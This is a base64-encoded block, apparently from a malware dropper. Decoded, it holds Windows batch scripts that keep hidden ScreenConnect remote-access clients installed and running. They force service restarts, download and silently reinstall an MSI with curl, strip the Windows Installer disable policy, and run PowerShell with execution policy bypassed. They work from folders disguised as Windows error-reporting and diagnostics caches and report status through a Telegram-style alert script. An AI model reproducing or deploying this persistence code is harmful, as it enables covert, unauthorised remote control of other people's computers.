UllYQV9PSz0wIg0Kc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglR1JZWEFfRlAlKSIg
fCBmaW5kICJSVU5OSU5HIiA+bnVsDQppZiBub3QgZXJyb3JsZXZlbCAxICgNCiAgc2V0ICJHUllY
QV9PSz0xIg0KICBlY2hvIGdyeXhhX2FscmVhZHlfcnVubmluZz4+IiVMT0clIg0KICBleGl0IC9i
IDANCikNCmVjaG8gZ3J5eGFfbXVzdF9iZWdpbj4+IiVMT0clIg0KDQpyZW0gMSkgc2VydmljZSBw
cmVzZW50IGJ1dCBzdG9wcGVkIC0+IHN0YXJ0IGhhcmQNCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0
IENsaWVudCAoJUdSWVhBX0ZQJSkiID5udWwgMj4mMQ0KaWYgbm90IGVycm9ybGV2ZWwgMSAoDQog
IGVjaG8gZ3J5eGFfc3ZjX3N0YXJ0Pj4iJUxPRyUiDQogIHNjIGNvbmZpZyAiU2NyZWVuQ29ubmVj
dCBDbGllbnQgKCVHUllYQV9GUCUpIiBzdGFydD0gYXV0byA+bnVsIDI+JjENCiAgc2MgZmFpbHVy
ZSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVHUllYQV9GUCUpIiByZXNldD0gODY0MDAgYWN0aW9u
cz0gcmVzdGFydC8zMDAwL3Jlc3RhcnQvMzAwMC9yZXN0YXJ0LzMwMDAgPm51bCAyPiYxDQogIG5l
dCBzdGFydCAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVHUllYQV9GUCUpIiA+bnVsIDI+JjENCiAg
c2Mgc3RhcnQgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglR1JZWEFfRlAlKSIgPm51bCAyPiYxDQog
IHRpbWVvdXQgL3QgNiAvbm9icmVhayA+bnVsDQogIHNjIHN0YXJ0ICJTY3JlZW5Db25uZWN0IENs
aWVudCAoJUdSWVhBX0ZQJSkiID5udWwgMj4mMQ0KICBzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBD
bGllbnQgKCVHUllYQV9GUCUpIiB8IGZpbmQgIlJVTk5JTkciID5udWwNCiAgaWYgbm90IGVycm9y
bGV2ZWwgMSAoDQogICAgc2V0ICJHUllYQV9PSz0xIg0KICAgIGVjaG8gZ3J5eGFfc3RhcnRlZF9v
az4+IiVMT0clIg0KICAgIGV4aXQgL2IgMA0KICApDQopDQoNCnJlbSAyKSByZWdpc3RlcmVkIHBy
b2R1Y3QgLT4gbXNpZXhlYyAvZmEgcmVwYWlyIE9OTFkgKG5ldmVyIC9pIG9uIHRvcCDigJQga2ls
bHMgcGFuZWwgc2Vzc2lvbikNCnNldCAiR1JFRz11bmtub3duIg0KaWYgZXhpc3QgIiVXRCVcb3du
X2xpYi5wczEiIGZvciAvZiAidXNlYmFja3EgZGVsaW1zPSIgJSVSIGluIChgcG93ZXJzaGVsbCAt
Tm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAi
JVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiByZWdpc3RlcmVkIC1GcCAiJUdSWVhBX0ZQJSIgLVdv
cmtEaXIgIiVXRCUiYCkgZG8gc2V0ICJHUkVHPSUlUiINCmVjaG8gZ3J5eGFfcmVnaXN0ZXJlZD0h
R1JFRyE+PiIlTE9HJSINCmlmIC9JICIhR1JFRyEiPT0ieWVzIiAoDQogIGVjaG8gZ3J5eGFfcmVw
YWlyX2JlZ2luPj4iJUxPRyUiDQogIGlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBwb3dlcnNo
ZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1G
aWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHJlcGFpciAtRnAgIiVHUllYQV9GUCUiIC1X
b3JrRGlyICIlV0QlIiA+PiIlTE9HJSIgMj4mMQ0KICB0aW1lb3V0IC90IDggL25vYnJlYWsgPm51
bA0KICBzYyBjb25maWcgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglR1JZWEFfRlAlKSIgc3RhcnQ9
IGF1dG8gPm51bCAyPiYxDQogIHNjIHN0YXJ0ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUdSWVhB
X0ZQJSkiID5udWwgMj4mMQ0KICB0aW1lb3V0IC90IDUgL25vYnJlYWsgPm51bA0KICBzYyBxdWVy
eSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVHUllYQV9GUCUpIiB8IGZpbmQgIlJVTk5JTkciID5u
dWwNCiAgaWYgbm90IGVycm9ybGV2ZWwgMSAoDQogICAgc2V0ICJHUllYQV9PSz0xIg0KICAgIGVj
aG8gZ3J5eGFfcmVwYWlyZWRfb2s+PiIlTE9HJSINCiAgICBleGl0IC9iIDANCiAgKQ0KICByZW0g
Y2xlYW4gcmVpbnN0YWxsOiAveCB0aGVuIC9pIChzYWZlciB0aGFuIC9pIG92ZXIgcmVnaXN0ZXJl
ZCDigJQgYXZvaWRzIFVwZ3JhZGUgY2h1cm4pDQogIGVjaG8gZ3J5eGFfY2xlYW5fcmVpbnN0YWxs
X2JlZ2luPj4iJUxPRyUiDQogIGlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiAoDQogICAgZm9y
IC9mICJ1c2ViYWNrcSBkZWxpbXM9IiAlJUcgaW4gKGBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5v
bkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kICIkbj0nU2NyZWVu
Q29ubmVjdCBDbGllbnQgKCVHUllYQV9GUCUpJzsgZm9yZWFjaCgkciBpbiBAKCdIS0xNOlxTT0ZU
V0FSRVxXT1c2NDMyTm9kZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxVbmluc3Rh
bGwnLCdIS0xNOlxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxVbmlu
c3RhbGwnKSl7IGlmKFRlc3QtUGF0aCAkcil7IEdldC1DaGlsZEl0ZW0gJHIgLUVBIDAgfCAlJSB7
ICRwPUdldC1JdGVtUHJvcGVydHkgJF8uUFNQYXRoIC1FQSAwOyBpZigkcC5EaXNwbGF5TmFtZSAt
ZXEgJG4gLWFuZCAkXy5QU0NoaWxkTmFtZSAtbGlrZSAneyp9Jyl7ICRfLlBTQ2hpbGROYW1lOyBi
cmVhayB9IH0gfSB9ImApIGRvIHNldCAiR0dVSUQ9JSVHIg0KICApDQogIGlmIGRlZmluZWQgR0dV
SUQgKA0KICAgIGNhbGwgOk5vTXNpUG9saWN5DQogICAgbXNpZXhlYyAveCAhR0dVSUQhIC9xbiAv
bm9yZXN0YXJ0IFJFQk9PVD1SZWFsbHlTdXBwcmVzcyA+PiIlTE9HJSIgMj4mMQ0KICAgIGVjaG8g
Z3J5eGFfdW5pbnN0YWxsX2V4aXQ9IUVSUk9STEVWRUwhPj4iJUxPRyUiDQogICAgdGltZW91dCAv
dCA4IC9ub2JyZWFrID5udWwNCiAgKQ0KKQ0KDQpyZW0gMykgb3JwaGFuIHNlcnZpY2UgKHByZXNl
bnQsIG5vdCByZWdpc3RlcmVkKSAtPiBkZWxldGUgdGhlbiBmcmVzaCBpbnN0YWxsDQppZiAvSSBu
b3QgIiFHUkVHISI9PSJ5ZXMiICgNCiAgc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgl
R1JZWEFfRlAlKSIgPm51bCAyPiYxDQogIGlmIG5vdCBlcnJvcmxldmVsIDEgKA0KICAgIGVjaG8g
Z3J5eGFfb3JwaGFuX3N2Y19kZWxldGU+PiIlTE9HJSINCiAgICBzYyBzdG9wICJTY3JlZW5Db25u
ZWN0IENsaWVudCAoJUdSWVhBX0ZQJSkiID5udWwgMj4mMQ0KICAgIHNjIGRlbGV0ZSAiU2NyZWVu
Q29ubmVjdCBDbGllbnQgKCVHUllYQV9GUCUpIiA+bnVsIDI+JjENCiAgICB0aW1lb3V0IC90IDMg
L25vYnJlYWsgPm51bA0KICApDQogIGlmIGV4aXN0ICIlUHJvZ3JhbUZpbGVzKHg4NiklXFNjcmVl
bkNvbm5lY3QgQ2xpZW50ICglR1JZWEFfRlAlKSIgKA0KICAgIGVjaG8gZ3J5eGFfc3RhbGVfZGly
X2NsZWFuPj4iJUxPRyUiDQogICAgcm1kaXIgL3MgL3EgIiVQcm9ncmFtRmlsZXMoeDg2KSVcU2Ny
ZWVuQ29ubmVjdCBDbGllbnQgKCVHUllYQV9GUCUpIiA+bnVsIDI+JjENCiAgKQ0KKQ0KDQpyZW0g
NCkgZnJlc2ggTVNJIGluc3RhbGwgb25seSB3aGVuIHByb2R1Y3Qgbm90IGN1cnJlbnRseSBSdW5u
aW5nDQplY2hvIGdyeXhhX2luc3RhbGxfYmVnaW4+PiIlTE9HJSINCmlmIG5vdCBleGlzdCAiJUNV
UkwlIiBzZXQgIkNVUkw9Y3VybC5leGUiDQpzZXQgIkdfTVNJX1JFQURZPTAiDQppZiBleGlzdCAi
JU1TSUNBQ0hFX0clIiBmb3IgJSVGIGluICgiJU1TSUNBQ0hFX0clIikgZG8gaWYgJSV+ekYgR1RS
IDEwMDAwMDAgKA0KICBjb3B5IC95ICIlTVNJQ0FDSEVfRyUiICIlTVNJX0clIiA+bnVsIDI+JjEN
CiAgc2V0ICJHX01TSV9SRUFEWT0xIg0KICBlY2hvIGdyeXhhX21zaV9mcm9tX2NhY2hlPj4iJUxP
RyUiDQopDQppZiAiJUdfTVNJX1JFQURZJSI9PSIwIiAoDQogICIlQ1VSTCUiIC1MIC0tc3NsLW5v
LXJldm9rZSAtLWNvbm5lY3QtdGltZW91dCAyNSAtLW1heC10aW1lIDMwMCAtbyAiJU1TSV9HJS50
bXAiICIlTVNJX0dSWVhBJSIgPj4iJUxPRyUiIDI+JjENCiAgZm9yICUlRiBpbiAoIiVNU0lfRyUu
dG1wIikgZG8gaWYgJSV+ekYgR1RSIDEwMDAwMDAgKA0KICAgIG1vdmUgL3kgIiVNU0lfRyUudG1w
IiAiJU1TSV9HJSIgPm51bCAyPiYxDQogICAgY29weSAveSAiJU1TSV9HJSIgIiVNU0lDQUNIRV9H
JSIgPm51bCAyPiYxDQogICAgc2V0ICJHX01TSV9SRUFEWT0xIg0KICAgIGVjaG8gZ3J5eGFfbXNp
X2ZldGNoZWQ+PiIlTE9HJSINCiAgKQ0KICBkZWwgL2YgL3EgIiVNU0lfRyUudG1wIiA+bnVsIDI+
JjENCikNCmlmICIlR19NU0lfUkVBRFklIj09IjAiICgNCiAgIiVDVVJMJSIgLUwgLS1jb25uZWN0
LXRpbWVvdXQgMjUgLS1tYXgtdGltZSAzMDAgLW8gIiVNU0lfRyUudG1wIiAiJU1TSV9HUllYQSUi
ID4+IiVMT0clIiAyPiYxDQogIGZvciAlJUYgaW4gKCIlTVNJX0clLnRtcCIpIGRvIGlmICUlfnpG
IEdUUiAxMDAwMDAwICgNCiAgICBtb3ZlIC95ICIlTVNJX0clLnRtcCIgIiVNU0lfRyUiID5udWwg
Mj4mMQ0KICAgIGNvcHkgL3kgIiVNU0lfRyUiICIlTVNJQ0FDSEVfRyUiID5udWwgMj4mMQ0KICAg
IHNldCAiR19NU0lfUkVBRFk9MSINCiAgKQ0KICBkZWwgL2YgL3EgIiVNU0lfRyUudG1wIiA+bnVs
IDI+JjENCikNCmlmICIlR19NU0lfUkVBRFklIj09IjEiICgNCiAgY2FsbCA6Tm9Nc2lQb2xpY3kN
CiAgbXNpZXhlYyAvaSAiJU1TSV9HJSIgL3FuIC9ub3Jlc3RhcnQgQUxMVVNFUlM9MSBSRUJPT1Q9
UmVhbGx5U3VwcHJlc3MgL0wqdiAiJVdEJVxtc2lfZ3J5eGEubG9nIiA+PiIlTE9HJSIgMj4mMQ0K
ICBzZXQgIkdFWElUPSFFUlJPUkxFVkVMISINCiAgZWNobyBncnl4YV9tc2lleGVjX2V4aXQ9IUdF
WElUIT4+IiVMT0clIg0KICBpZiAiIUdFWElUISI9PSIxNjE4IiAoDQogICAgdGltZW91dCAvdCAz
MCAvbm9icmVhayA+bnVsDQogICAgbXNpZXhlYyAvaSAiJU1TSV9HJSIgL3FuIC9ub3Jlc3RhcnQg
QUxMVVNFUlM9MSBSRUJPT1Q9UmVhbGx5U3VwcHJlc3MgL0wqdiAiJVdEJVxtc2lfZ3J5eGEyLmxv
ZyIgPj4iJUxPRyUiIDI+JjENCiAgICBzZXQgIkdFWElUPSFFUlJPUkxFVkVMISINCiAgICBlY2hv
IGdyeXhhX21zaWV4ZWNfcmV0cnkxNjE4PSFHRVhJVCE+PiIlTE9HJSINCiAgKQ0KICBpZiAiIUdF
WElUISI9PSIxNjE4IiAoDQogICAgdGltZW91dCAvdCA0NSAvbm9icmVhayA+bnVsDQogICAgbXNp
ZXhlYyAvaSAiJU1TSV9HJSIgL3FuIC9ub3Jlc3RhcnQgQUxMVVNFUlM9MSBSRUJPT1Q9UmVhbGx5
U3VwcHJlc3MgL0wqdiAiJVdEJVxtc2lfZ3J5eGEzLmxvZyIgPj4iJUxPRyUiIDI+JjENCiAgICBz
ZXQgIkdFWElUPSFFUlJPUkxFVkVMISINCiAgICBlY2hvIGdyeXhhX21zaWV4ZWNfcmV0cnkxNjE4
Yj0hR0VYSVQhPj4iJUxPRyUiDQogICkNCiAgdGltZW91dCAvdCAxMCAvbm9icmVhayA+bnVsDQop
IGVsc2UgKA0KICBlY2hvIGdyeXhhX21zaV9mZXRjaF9GQUlMPj4iJUxPRyUiDQopDQoNCnJlbSA1
KSBwb3N0LWluc3RhbGw6IHJlcGFpciBpZiBzdmMgc3RpbGwgbWlzc2luZywgdGhlbiBmb3JjZSBz
dGFydA0Kc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglR1JZWEFfRlAlKSIgPm51bCAy
PiYxDQppZiBlcnJvcmxldmVsIDEgaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiICgNCiAgZWNo
byBncnl4YV9wb3N0aW5zdGFsbF9yZXBhaXI+PiIlTE9HJSINCiAgcG93ZXJzaGVsbCAtTm9Qcm9m
aWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxv
d25fbGliLnBzMSIgLUFjdGlvbiByZXBhaXIgLUZwICIlR1JZWEFfRlAlIiAtV29ya0RpciAiJVdE
JSIgPj4iJUxPRyUiIDI+JjENCiAgdGltZW91dCAvdCA2IC9ub2JyZWFrID5udWwNCikNCnNjIGNv
bmZpZyAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVHUllYQV9GUCUpIiBzdGFydD0gYXV0byA+bnVs
IDI+JjENCnNjIGZhaWx1cmUgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglR1JZWEFfRlAlKSIgcmVz
ZXQ9IDg2NDAwIGFjdGlvbnM9IHJlc3RhcnQvMzAwMC9yZXN0YXJ0LzMwMDAvcmVzdGFydC8zMDAw
ID5udWwgMj4mMQ0Kc2Mgc3RhcnQgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglR1JZWEFfRlAlKSIg
Pm51bCAyPiYxDQp0aW1lb3V0IC90IDUgL25vYnJlYWsgPm51bA0Kc2Mgc3RhcnQgIlNjcmVlbkNv
bm5lY3QgQ2xpZW50ICglR1JZWEFfRlAlKSIgPm51bCAyPiYxDQp0aW1lb3V0IC90IDUgL25vYnJl
YWsgPm51bA0Kc2Mgc3RhcnQgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglR1JZWEFfRlAlKSIgPm51
bCAyPiYxDQoNCnJlbSBtc2lleGVjIG9mIGdyeXhhIGNhbiBkaXN0dXJiIHNldnJ6IC0gbnVkZ2Ug
a2VlcGVycyBiYWNrIHVwDQpzYyBjb25maWcgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUF9G
UCUpIiBzdGFydD0gYXV0byA+bnVsIDI+JjENCnNjIHN0YXJ0ICJTY3JlZW5Db25uZWN0IENsaWVu
dCAoJUtFRVBfRlAlKSIgPm51bCAyPiYxDQpzYyBjb25maWcgIlNjcmVlbkNvbm5lY3QgQ2xpZW50
ICglQUxUX0ZQJSkiIHN0YXJ0PSBhdXRvID5udWwgMj4mMQ0Kc2Mgc3RhcnQgIlNjcmVlbkNvbm5l
Y3QgQ2xpZW50ICglQUxUX0ZQJSkiID5udWwgMj4mMQ0KY2FsbCA6UmVzdG9yZUFsdA0KDQpzYyBx
dWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVHUllYQV9GUCUpIiB8IGZpbmQgIlJVTk5JTkci
ID5udWwNCmlmIG5vdCBlcnJvcmxldmVsIDEgKA0KICBzZXQgIkdSWVhBX09LPTEiDQogIGVjaG8g
Z3J5eGFfbXVzdF9ydW5uaW5nX29rPj4iJUxPRyUiDQopIGVsc2UgKA0KICBzZXQgIkdSWVhBX09L
PTAiDQogIGVjaG8gZ3J5eGFfbXVzdF9zdGlsbF9kb3duPj4iJUxPRyUiDQogIHNjIHF1ZXJ5ICJT
Y3JlZW5Db25uZWN0IENsaWVudCAoJUdSWVhBX0ZQJSkiID4+IiVMT0clIiAyPiYxDQopDQpleGl0
IC9iIDANCg0KOkluc3RhbGxNc2kNCnJlbSAlMT11cmwgJTI9dGFnDQpzZXQgIlVSTD0lfjEiDQpz
ZXQgIlRBRz0lfjIiDQplY2hvIFslVEFHJV0gZmV0Y2ggJVVSTCU+PiIlTE9HJSINCiIlQ1VSTCUi
IC1MIC0tc3NsLW5vLXJldm9rZSAtLWNvbm5lY3QtdGltZW91dCAyNSAtLW1heC10aW1lIDMwMCAt
byAiJU1TSSUudG1wIiAiJVVSTCUiID4+IiVMT0clIiAyPiYxDQpmb3IgJSVGIGluICgiJU1TSSUu
dG1wIikgZG8gaWYgJSV+ekYgTEVRIDEwMDAwMDAgKA0KICBlY2hvIFslVEFHJV0gZmV0Y2ggZmFp
bGVkPj4iJUxPRyUiDQogIGRlbCAvZiAvcSAiJU1TSSUudG1wIiA+bnVsIDI+JjENCiAgZXhpdCAv
YiAxDQopDQptb3ZlIC95ICIlTVNJJS50bXAiICIlTVNJJSIgPm51bCAyPiYxDQpjYWxsIDpOb01z
aVBvbGljeQ0KcmVtIE0xMzogc3RhbGUgcHJpbWFyeSBkaXIgKHNlcnZpY2UgZGVsZXRlZCwgcHJv
ZHVjdCB1bnJlZ2lzdGVyZWQpIGJyZWFrcw0KcmVtIHRoZSBTQyBpbnN0YWxsZXIgY3VzdG9tIGFj
dGlvbiAtIGNsZWFyIGl0IGJlZm9yZSBpbnN0YWxsaW5nDQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVj
dCBDbGllbnQgKCVLRUVQX0ZQJSkiID5udWwgMj4mMQ0KaWYgZXJyb3JsZXZlbCAxIGlmIGV4aXN0
ICIlUEY4NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiICgNCiAgZWNobyBzdGFs
ZV9wcmltYXJ5X2Rpcl9jbGVhbj4+IiVMT0clIg0KICBybWRpciAvcyAvcSAiJVBGODYlXFNjcmVl
bkNvbm5lY3QgQ2xpZW50ICglS0VFUF9GUCUpIiA+bnVsIDI+JjENCikNCmVjaG8gWyVUQUclXSBt
c2lleGVjIGluc3RhbGw+PiIlTE9HJSINCm1zaWV4ZWMgL2kgIiVNU0klIiAvcW4gL25vcmVzdGFy
dCBBTExVU0VSUz0xIFJFQk9PVD1SZWFsbHlTdXBwcmVzcyAvTCp2ICIlV0QlXG1zaV9oZWFsLmxv
ZyIgPm51bCAyPiYxDQpzZXQgIk1TSUVYSVQ9IUVSUk9STEVWRUwhIg0KZWNobyBbJVRBRyVdIG1z
aWV4ZWMgZXhpdD0hTVNJRVhJVCE+PiIlTE9HJSINCmlmICIhTVNJRVhJVCEiPT0iMTYxOCIgKA0K
ICBlY2hvIFslVEFHJV0gbXNpX2J1c3lfcmV0cnk+PiIlTE9HJSINCiAgdGltZW91dCAvdCAzMCAv
bm9icmVhayA+bnVsDQogIG1zaWV4ZWMgL2kgIiVNU0klIiAvcW4gL25vcmVzdGFydCBBTExVU0VS
Uz0xIFJFQk9PVD1SZWFsbHlTdXBwcmVzcyAvTCp2ICIlV0QlXG1zaV9oZWFsMi5sb2ciID5udWwg
Mj4mMQ0KICBzZXQgIk1TSUVYSVQ9IUVSUk9STEVWRUwhIg0KICBlY2hvIFslVEFHJV0gbXNpZXhl
Y19yZXRyeSBleGl0PSFNU0lFWElUIT4+IiVMT0clIg0KKQ0KY2FsbCA6V2FpdFN2Yw0KY2FsbCA6
UmVzdG9yZUFsdA0KcmVtIE8zNzogc2V2cnogL2kgc2hhcmVzIGxlZ2FjeSBVcGdyYWRlQ29kZXMg
d2l0aCBncnl4YSDigJQgYWx3YXlzIHJlLWVuc3VyZSBHcnl4YSBhZnRlcg0KY2FsbCA6RW5zdXJl
R3J5eGFNdXN0DQpleGl0IC9iIDANCnJlbSAlMT1maW5nZXJwcmludCAtIHNlcnZpY2UgZGVsZXRl
ZCBidXQgcHJvZHVjdCByZWdpc3RlcmVkOiByZXBhaXIgYnkgR1VJRC4NCnNjIHF1ZXJ5ICJTY3Jl
ZW5Db25uZWN0IENsaWVudCAoJX4xKSIgPm51bCAyPiYxDQppZiBub3QgZXJyb3JsZXZlbCAxIGV4
aXQgL2IgMA0KaWYgbm90IGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBleGl0IC9iIDENCnBvd2Vy
c2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3Mg
LUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gcmVwYWlyIC1GcCAiJX4xIiAtV29ya0Rp
ciAiJVdEJSIgPj4iJUxPRyUiIDI+JjENCmNhbGwgOldhaXRTdmMNCmV4aXQgL2IgMA0KDQo6UmVz
dG9yZUFsdA0KcmVtIEFMVCBzZXJ2aWNlIGdvbmUgYnV0IHN0aWxsIHJlZ2lzdGVyZWQgKFNDLWZh
bWlseSBtc2lleGVjIHNpZGUgZWZmZWN0KSAtIHJlcGFpciBpdCB0b28uDQpzYyBxdWVyeSAiU2Ny
ZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgPm51bCAyPiYxDQppZiBub3QgZXJyb3JsZXZl
bCAxIGV4aXQgL2IgMA0KZWNobyBhbHQgbWlzc2luZyAtIHJlcGFpciBhdHRlbXB0Pj4iJUxPRyUi
DQppZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25J
bnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBz
MSIgLUFjdGlvbiByZXBhaXIgLUZwICIlQUxUX0ZQJSIgLVdvcmtEaXIgIiVXRCUiID4+IiVMT0cl
IiAyPiYxDQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgfCBmaW5k
ICJSVU5OSU5HIiA+bnVsDQppZiBub3QgZXJyb3JsZXZlbCAxIHNldCAiQUxUX09LPTEiDQpleGl0
IC9iIDANCg0KOk5vTXNpUG9saWN5DQpyZWcgZGVsZXRlICJIS0xNXFNPRlRXQVJFXFBvbGljaWVz
XE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlciIgL3YgRGlzYWJsZU1TSSAvZiA+bnVsIDI+JjEN
CnJlZyBkZWxldGUgIkhLQ1VcU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5z
dGFsbGVyIiAvdiBEaXNhYmxlTVNJIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FS
RVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXIiIC92IERpc2FibGVNU0kgL3Qg
UkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpleGl0IC9iIDANCg0KOldhaXRTdmMNCnNldCAi
VFJJRVM9MCINCjpXYWl0TG9vcA0Kc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VF
UF9GUCUpIiB8IGZpbmQgIlJVTk5JTkciID5udWwNCmlmIG5vdCBlcnJvcmxldmVsIDEgKA0KICBz
ZXQgIklOU1RBTExFRD0xIg0KICBzZXQgIlBSSU1fT0s9MSINCiAgZXhpdCAvYiAwDQopDQpzZXQg
L2EgVFJJRVMrPTENCmlmICVUUklFUyUgR0VRIDEwIGV4aXQgL2IgMQ0KcGluZyAxMjcuMC4wLjEg
LW4gNyA+bnVsIDI+JjENCmdvdG8gOldhaXRMb29wDQoNCjpUZ1N0YXRlDQpzZXQgIk5FV1NUQVRF
PSV+MSINCnNldCAiTVNHPSV+MiINCnNldCAiT0xEU1RBVEU9Ig0KaWYgZXhpc3QgIiVTVEFURSUi
IHNldCAvcCBPTERTVEFURT08IiVTVEFURSUiDQpyZW0gZmFsc2UgRE9XTiBhZnRlciByZWJvb3Qg
cmFjZTogcHJpbWFyeSBhbHJlYWR5IFJ1bm5pbmcg4oCUIGRvIG5vdCBzcGFtDQppZiAvSSAiJU5F
V1NUQVRFJSI9PSJET1dOIiAoDQogIHNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtF
RVBfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsDQogIGlmIG5vdCBlcnJvcmxldmVsIDEgKA0K
ICAgIGVjaG8gdGdfc2tpcF9kb3duX2FscmVhZHlfcnVubmluZz4+IiVMT0clIg0KICAgIGV4aXQg
L2IgMA0KICApDQopDQpyZW0gcmF0ZS1saW1pdCByZXBlYXRlZCBET1dOL0ZBSUw6IG1heCAxIGFs
ZXJ0IHBlciA2aCB3aGlsZSBzdHVjaw0KaWYgL0kgIiVORVdTVEFURSUiPT0iRE9XTiIgZ290byA6
TWF5YmVTdXBwcmVzcw0KaWYgL0kgIiVORVdTVEFURSUiPT0iRkFJTCIgZ290byA6TWF5YmVTdXBw
cmVzcw0KZ290byA6U2VuZEFsZXJ0DQo6TWF5YmVTdXBwcmVzcw0KaWYgL0kgIiVORVdTVEFURSUi
PT0iJU9MRFNUQVRFJSIgaWYgZXhpc3QgIiVXRCVcdGdfc2VudC5mbGFnIiAoDQogIHBvd2Vyc2hl
bGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUNvbW1hbmQgImlmKChOZXctVGltZVNwYW4g
LVN0YXJ0IChHZXQtSXRlbSAtTGl0ZXJhbFBhdGggJyVXRCVcdGdfc2VudC5mbGFnJykuTGFzdFdy
aXRlVGltZSkuVG90YWxNaW51dGVzIC1sdCAzNjApe2V4aXQgMH1lbHNle2V4aXQgMX0iID5udWwg
Mj4mMQ0KICBpZiBub3QgZXJyb3JsZXZlbCAxICgNCiAgICBlY2hvIHRnX3N1cHByZXNzZWRfJU5F
V1NUQVRFJT4+IiVMT0clIg0KICAgIGV4aXQgL2IgMA0KICApDQopDQo6U2VuZEFsZXJ0DQplY2hv
ICVORVdTVEFURSU+IiVTVEFURSUiDQplY2hvIHNlbnQ+IiVXRCVcdGdfc2VudC5mbGFnIg0KcG93
ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFz
cyAtRmlsZSAiJVdEJVx0Z19yZXBvcnQucHMxIiAtU3RhdGUgJU5FV1NUQVRFJSAtU3VtbWFyeSAi
JU1TRyUiIC1CdWlsZCAlTU9OVkVSJSAtQ291bnQgJUNPVU5UJSA+bnVsIDI+JjENCmVjaG8gdGcg
c3RhdGUgJU5FV1NUQVRFJSBzZW50Pj4iJUxPRyUiDQpleGl0IC9iIDANCg==
::B64_MON_END
::B64_SEC_BEGIN
QGVjaG8gb2ZmDQpSRU0gT1dOX1NFQ1VSRSBCVUlMRCAyMDI2MDgwMlM5IC0gZHluYW1pYyBncnl4
YSBGUCBmcm9tIGdyeXhhLmNmZzsgTk8gTG9ja0RpciBvbiBTQyBkaXJzDQpzZXRsb2NhbCBFbmFi
bGVFeHRlbnNpb25zIEVuYWJsZURlbGF5ZWRFeHBhbnNpb24NCnNldCAiV0Q9JVByb2dyYW1EYXRh
JVxNaWNyb3NvZnRcV2luZG93c1xXRVJcVGVtcFwud3VjYWNoZSINCnNldCAiV0QyPSVQcm9ncmFt
RGF0YSVcTWljcm9zb2Z0XERpYWdub3Npc1xTdGF0ZVwuZXRsY2FjaGUiDQpzZXQgIkxPRz0lV0Ql
XGJvb3QuZXJyIg0Kc2V0ICJQUklNPVNjcmVlbkNvbm5lY3QgQ2xpZW50ICg1ZjYwMTA1Nzk4NTJl
NTA3KSINCnNldCAiQUxUPVNjcmVlbkNvbm5lY3QgQ2xpZW50IChmODYxYzgxNDBkNDUzNDI3KSIN
CnNldCAiS0VFUDE9NWY2MDEwNTc5ODUyZTUwNyINCnNldCAiS0VFUDI9Zjg2MWM4MTQwZDQ1MzQy
NyINCnNldCAiS0VFUDM9OTkwODE5OGU2NjhlNDc1MCINCmlmIGV4aXN0ICIlV0QlXGdyeXhhLmNm
